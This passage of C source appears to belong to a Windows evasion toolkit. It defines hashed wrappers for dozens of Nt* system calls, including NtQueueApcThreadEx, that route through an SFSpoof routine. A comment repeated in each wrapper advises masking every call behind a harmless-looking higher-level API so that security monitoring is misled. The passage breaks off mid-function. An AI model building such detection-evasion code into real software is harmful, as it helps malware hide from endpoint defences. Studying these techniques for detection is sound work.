NTSTATUS SFNtQueryInformationWorkerFactory(HANDLE WorkerFactoryHandle, WORKERFACTORYINFOCLASS WorkerFactoryInformationClass, PVOID WorkerFactoryInformation, ULONG WorkerFactoryInformationLength, PULONG ReturnLength) {
    Params.param[1] = (DWORD_PTR)WorkerFactoryHandle;
    Params.param[2] = (DWORD_PTR)WorkerFactoryInformationClass;
    Params.param[3] = (DWORD_PTR)WorkerFactoryInformation;
    Params.param[4] = (DWORD_PTR)WorkerFactoryInformationLength;
    Params.param[5] = (DWORD_PTR)ReturnLength;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 5;
    Params.FuncHash = 0x0B412B09C;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtQueryInstallUILanguage(PLANGID InstallUILanguageId) {
    Params.param[1] = (DWORD_PTR)InstallUILanguageId;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 1;
    Params.FuncHash = 0x0E1B6EE13;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtQueryIntervalProfile(KPROFILE_SOURCE ProfileSource, PULONG Interval) {
    Params.param[1] = (DWORD_PTR)ProfileSource;
    Params.param[2] = (DWORD_PTR)Interval;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x00591FDD5;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtQueryIoCompletion(HANDLE IoCompletionHandle, IO_COMPLETION_INFORMATION_CLASS IoCompletionInformationClass, PVOID IoCompletionInformation, ULONG IoCompletionInformationLength, PULONG ReturnLength) {
    Params.param[1] = (DWORD_PTR)IoCompletionHandle;
    Params.param[2] = (DWORD_PTR)IoCompletionInformationClass;
    Params.param[3] = (DWORD_PTR)IoCompletionInformation;
    Params.param[4] = (DWORD_PTR)IoCompletionInformationLength;
    Params.param[5] = (DWORD_PTR)ReturnLength;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 5;
    Params.FuncHash = 0x0CA83C86F;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtQueryLicenseValue(PUNICODE_STRING ValueName, PULONG Type, PVOID SystemData, ULONG DataSize, PULONG ResultDataSize) {
    Params.param[1] = (DWORD_PTR)ValueName;
    Params.param[2] = (DWORD_PTR)Type;
    Params.param[3] = (DWORD_PTR)SystemData;
    Params.param[4] = (DWORD_PTR)DataSize;
    Params.param[5] = (DWORD_PTR)ResultDataSize;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 5;
    Params.FuncHash = 0x03A9E050C;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtQueryMultipleValueKey(HANDLE KeyHandle, PKEY_VALUE_ENTRY ValueEntries, ULONG EntryCount, PVOID ValueBuffer, PULONG BufferLength, PULONG RequiredBufferLength) {
    Params.param[1] = (DWORD_PTR)KeyHandle;
    Params.param[2] = (DWORD_PTR)ValueEntries;
    Params.param[3] = (DWORD_PTR)EntryCount;
    Params.param[4] = (DWORD_PTR)ValueBuffer;
    Params.param[5] = (DWORD_PTR)BufferLength;
    Params.param[6] = (DWORD_PTR)RequiredBufferLength;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 6;
    Params.FuncHash = 0x0BE288193;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtQueryMutant(HANDLE MutantHandle, MUTANT_INFORMATION_CLASS MutantInformationClass, PVOID MutantInformation, ULONG MutantInformationLength, PULONG ReturnLength) {
    Params.param[1] = (DWORD_PTR)MutantHandle;
    Params.param[2] = (DWORD_PTR)MutantInformationClass;
    Params.param[3] = (DWORD_PTR)MutantInformation;
    Params.param[4] = (DWORD_PTR)MutantInformationLength;
    Params.param[5] = (DWORD_PTR)ReturnLength;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 5;
    Params.FuncHash = 0x0FC13FF84;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtQueryOpenSubKeys(POBJECT_ATTRIBUTES TargetKey, PULONG HandleCount) {
    Params.param[1] = (DWORD_PTR)TargetKey;
    Params.param[2] = (DWORD_PTR)HandleCount;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x02183DEC8;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtQueryOpenSubKeysEx(POBJECT_ATTRIBUTES TargetKey, ULONG BufferLength, PVOID Buffer, PULONG RequiredSize) {
    Params.param[1] = (DWORD_PTR)TargetKey;
    Params.param[2] = (DWORD_PTR)BufferLength;
    Params.param[3] = (DWORD_PTR)Buffer;
    Params.param[4] = (DWORD_PTR)RequiredSize;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 4;
    Params.FuncHash = 0x08B4B3D74;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtQueryPortInformationProcess() {
    Params.param[1] = 0;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 0;
    Params.FuncHash = 0x03D9F3A0C;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtQueryQuotaInformationFile(HANDLE FileHandle, PIO_STATUS_BLOCK IoStatusBlock, PFILE_USER_QUOTA_INFORMATION Buffer, ULONG Length, BOOLEAN ReturnSingleEntry, PFILE_QUOTA_LIST_INFORMATION SidList, ULONG SidListLength, PSID StartSid, BOOLEAN RestartScan) {
    Params.param[1] = (DWORD_PTR)FileHandle;
    Params.param[2] = (DWORD_PTR)IoStatusBlock;
    Params.param[3] = (DWORD_PTR)Buffer;
    Params.param[4] = (DWORD_PTR)Length;
    Params.param[5] = (DWORD_PTR)ReturnSingleEntry;
    Params.param[6] = (DWORD_PTR)SidList;
    Params.param[7] = (DWORD_PTR)SidListLength;
    Params.param[8] = (DWORD_PTR)StartSid;
    Params.param[9] = (DWORD_PTR)RestartScan;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 9;
    Params.FuncHash = 0x09D075527;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtQuerySecurityAttributesToken(HANDLE TokenHandle, PUNICODE_STRING Attributes, ULONG NumberOfAttributes, PVOID Buffer, ULONG Length, PULONG ReturnLength) {
    Params.param[1] = (DWORD_PTR)TokenHandle;
    Params.param[2] = (DWORD_PTR)Attributes;
    Params.param[3] = (DWORD_PTR)NumberOfAttributes;
    Params.param[4] = (DWORD_PTR)Buffer;
    Params.param[5] = (DWORD_PTR)Length;
    Params.param[6] = (DWORD_PTR)ReturnLength;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 6;
    Params.FuncHash = 0x039986334;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtQuerySecurityObject(HANDLE Handle, SECURITY_INFORMATION SecurityInformation, PSECURITY_DESCRIPTOR SecurityDescriptor, ULONG Length, PULONG LengthNeeded) {
    Params.param[1] = (DWORD_PTR)Handle;
    Params.param[2] = (DWORD_PTR)SecurityInformation;
    Params.param[3] = (DWORD_PTR)SecurityDescriptor;
    Params.param[4] = (DWORD_PTR)Length;
    Params.param[5] = (DWORD_PTR)LengthNeeded;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 5;
    Params.FuncHash = 0x084946FC8;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtQuerySecurityPolicy(DWORD_PTR UnknownParameter1, DWORD_PTR UnknownParameter2, DWORD_PTR UnknownParameter3, DWORD_PTR UnknownParameter4, DWORD_PTR UnknownParameter5, DWORD_PTR UnknownParameter6) {
    Params.param[1] = (DWORD_PTR)UnknownParameter1;
    Params.param[2] = (DWORD_PTR)UnknownParameter2;
    Params.param[3] = (DWORD_PTR)UnknownParameter3;
    Params.param[4] = (DWORD_PTR)UnknownParameter4;
    Params.param[5] = (DWORD_PTR)UnknownParameter5;
    Params.param[6] = (DWORD_PTR)UnknownParameter6;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 6;
    Params.FuncHash = 0x032A80517;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtQuerySemaphore(HANDLE SemaphoreHandle, SEMAPHORE_INFORMATION_CLASS SemaphoreInformationClass, PVOID SemaphoreInformation, ULONG SemaphoreInformationLength, PULONG ReturnLength) {
    Params.param[1] = (DWORD_PTR)SemaphoreHandle;
    Params.param[2] = (DWORD_PTR)SemaphoreInformationClass;
    Params.param[3] = (DWORD_PTR)SemaphoreInformation;
    Params.param[4] = (DWORD_PTR)SemaphoreInformationLength;
    Params.param[5] = (DWORD_PTR)ReturnLength;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 5;
    Params.FuncHash = 0x0565A40E2;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtQuerySymbolicLinkObject(HANDLE LinkHandle, PUNICODE_STRING LinkTarget, PULONG ReturnedLength) {
    Params.param[1] = (DWORD_PTR)LinkHandle;
    Params.param[2] = (DWORD_PTR)LinkTarget;
    Params.param[3] = (DWORD_PTR)ReturnedLength;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 3;
    Params.FuncHash = 0x0369B0039;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtQuerySystemEnvironmentValue(PUNICODE_STRING VariableName, PVOID VariableValue, ULONG ValueLength, PULONG ReturnLength) {
    Params.param[1] = (DWORD_PTR)VariableName;
    Params.param[2] = (DWORD_PTR)VariableValue;
    Params.param[3] = (DWORD_PTR)ValueLength;
    Params.param[4] = (DWORD_PTR)ReturnLength;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 4;
    Params.FuncHash = 0x0CE2CEFE6;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtQuerySystemEnvironmentValueEx(PUNICODE_STRING VariableName, LPGUID VendorGuid, PVOID Value, PULONG ValueLength, PULONG Attributes) {
    Params.param[1] = (DWORD_PTR)VariableName;
    Params.param[2] = (DWORD_PTR)VendorGuid;
    Params.param[3] = (DWORD_PTR)Value;
    Params.param[4] = (DWORD_PTR)ValueLength;
    Params.param[5] = (DWORD_PTR)Attributes;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 5;
    Params.FuncHash = 0x021CAEC8F;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtQuerySystemInformationEx(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID InputBuffer, ULONG InputBufferLength, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength) {
    Params.param[1] = (DWORD_PTR)SystemInformationClass;
    Params.param[2] = (DWORD_PTR)InputBuffer;
    Params.param[3] = (DWORD_PTR)InputBufferLength;
    Params.param[4] = (DWORD_PTR)SystemInformation;
    Params.param[5] = (DWORD_PTR)SystemInformationLength;
    Params.param[6] = (DWORD_PTR)ReturnLength;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 6;
    Params.FuncHash = 0x08093DE55;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtQueryTimerResolution(PULONG MaximumTime, PULONG MinimumTime, PULONG CurrentTime) {
    Params.param[1] = (DWORD_PTR)MaximumTime;
    Params.param[2] = (DWORD_PTR)MinimumTime;
    Params.param[3] = (DWORD_PTR)CurrentTime;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 3;
    Params.FuncHash = 0x082181C15;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtQueryWnfStateData(PCWNF_STATE_NAME StateName, PCWNF_TYPE_ID TypeId, PVOID ExplicitScope, PWNF_CHANGE_STAMP ChangeStamp, PVOID Buffer, PULONG BufferSize) {
    Params.param[1] = (DWORD_PTR)StateName;
    Params.param[2] = (DWORD_PTR)TypeId;
    Params.param[3] = (DWORD_PTR)ExplicitScope;
    Params.param[4] = (DWORD_PTR)ChangeStamp;
    Params.param[5] = (DWORD_PTR)Buffer;
    Params.param[6] = (DWORD_PTR)BufferSize;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 6;
    Params.FuncHash = 0x0240B70C0;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtQueryWnfStateNameInformation(PCWNF_STATE_NAME StateName, PCWNF_TYPE_ID NameInfoClass, PVOID ExplicitScope, PVOID InfoBuffer, ULONG InfoBufferSize) {
    Params.param[1] = (DWORD_PTR)StateName;
    Params.param[2] = (DWORD_PTR)NameInfoClass;
    Params.param[3] = (DWORD_PTR)ExplicitScope;
    Params.param[4] = (DWORD_PTR)InfoBuffer;
    Params.param[5] = (DWORD_PTR)InfoBufferSize;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 5;
    Params.FuncHash = 0x0128BF1DB;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtQueueApcThreadEx(HANDLE ThreadHandle, HANDLE UserApcReserveHandle, PKNORMAL_ROUTINE ApcRoutine, PVOID ApcArgument1, PVOID ApcArgument2, PVOID ApcArgument3) {
    Params.param[1] = (DWORD_PTR)ThreadHandle;
    Params.param[2] = (DWORD_PTR)UserApcReserveHandle;
    Params.param[3] = (DWORD_PTR)ApcRoutine;
    Params.param[4] = (DWORD_PTR)ApcArgument1;
    Params.param[5] = (DWORD_PTR)ApcArgument2;
    Params.param[6] = (DWORD_PTR)ApcArgument3;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 6;
    Params.FuncHash = 0x098A7C641;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtRaiseException(PEXCEPTION_RECORD ExceptionRecord, PCONTEXT ContextRecord, BOOLEAN FirstChance) {
    Params.param[1] = (DWORD_PTR)ExceptionRecord;
    Params.param[2] = (DWORD_PTR)ContextRecord;
    Params.param[3] = (DWORD_PTR)FirstChance;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 3;
    Params.FuncHash = 0x017425269;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtRaiseHardError(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PDWORD_PTR Parameters, ULONG ValidResponseOptions, PULONG Response) {
    Params.param[1] = (DWORD_PTR)ErrorStatus;
    Params.param[2] = (DWORD_PTR)NumberOfParameters;
    Params.param[3] = (DWORD_PTR)UnicodeStringParameterMask;
    Params.param[4] = (DWORD_PTR)Parameters;
    Params.param[5] = (DWORD_PTR)ValidResponseOptions;
    Params.param[6] = (DWORD_PTR)Response;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 6;
    Params.FuncHash = 0x0BFEF9F5D;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtReadOnlyEnlistment(HANDLE EnlistmentHandle, PLARGE_INTEGER TmVirtualClock) {
    Params.param[1] = (DWORD_PTR)EnlistmentHandle;
    Params.param[2] = (DWORD_PTR)TmVirtualClock;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x00998120F;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtRecoverEnlistment(HANDLE EnlistmentHandle, PVOID EnlistmentKey) {
    Params.param[1] = (DWORD_PTR)EnlistmentHandle;
    Params.param[2] = (DWORD_PTR)EnlistmentKey;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x00BE50A6F;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtRecoverResourceManager(HANDLE ResourceManagerHandle) {
    Params.param[1] = (DWORD_PTR)ResourceManagerHandle;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 1;
    Params.FuncHash = 0x0F1E72CAF;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtRecoverTransactionManager(HANDLE TransactionManagerHandle) {
    Params.param[1] = (DWORD_PTR)TransactionManagerHandle;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 1;
    Params.FuncHash = 0x01A20822A;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtRegisterProtocolAddressInformation(HANDLE ResourceManager, LPGUID ProtocolId, ULONG ProtocolInformationSize, PVOID ProtocolInformation, ULONG CreateOptions) {
    Params.param[1] = (DWORD_PTR)ResourceManager;
    Params.param[2] = (DWORD_PTR)ProtocolId;
    Params.param[3] = (DWORD_PTR)ProtocolInformationSize;
    Params.param[4] = (DWORD_PTR)ProtocolInformation;
    Params.param[5] = (DWORD_PTR)CreateOptions;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 5;
    Params.FuncHash = 0x00E99C3CA;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtRegisterThreadTerminatePort(HANDLE PortHandle) {
    Params.param[1] = (DWORD_PTR)PortHandle;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 1;
    Params.FuncHash = 0x02EB2C4EC;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtReleaseKeyedEvent(HANDLE KeyedEventHandle, PVOID KeyValue, BOOLEAN Alertable, PLARGE_INTEGER Timeout) {
    Params.param[1] = (DWORD_PTR)KeyedEventHandle;
    Params.param[2] = (DWORD_PTR)KeyValue;
    Params.param[3] = (DWORD_PTR)Alertable;
    Params.param[4] = (DWORD_PTR)Timeout;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 4;
    Params.FuncHash = 0x0B8155B82;
    SFSpoof(Params.FuncHash);
